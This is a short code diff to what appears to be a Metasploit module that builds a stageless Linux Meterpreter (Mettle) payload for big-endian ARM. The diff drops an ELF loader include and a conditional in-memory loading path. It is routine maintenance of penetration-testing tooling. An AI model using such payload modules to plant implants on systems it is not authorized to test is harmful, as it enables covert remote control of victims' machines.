@@ -8,11 +8,9 @@
 module MetasploitModule
   CachedSize = 1106544
 
-
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions::Linux
   include Msf::Sessions::MettleConfig
-  include Msf::Payload::Linux::Armbe::ElfLoader
   include Msf::Payload::Linux::Armbe::Prepends
 
   def initialize(info = {})
@@ -41,10 +39,6 @@ module MetasploitModule
       stageless: true
     }.merge(mettle_logging_config)
     payload = MetasploitPayloads::Mettle.new('armv5b-linux-musleabi', generate_config(opts)).to_binary :exec
-    ds = opts[:datastore] || datastore
-    if ds['PayloadLinuxMinKernel'] == '3.17'
-      return in_memory_load(payload) + payload
-    end
     payload
   end
 end
